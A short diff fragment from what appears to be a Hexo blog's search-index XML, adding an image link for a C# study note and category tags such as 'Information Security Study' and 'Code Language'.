+<img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/SplitRun2.png" class>
 
 
 ]]></content>
       <categories>
+        <category>Information Security Study</category>
+        <category>Code Language</category>
+        <category>C＃</category>
         <category>Game</category>
+        <category>Code Language</category>
       </categories>
       <tags>
         <tag>C＃</tag>
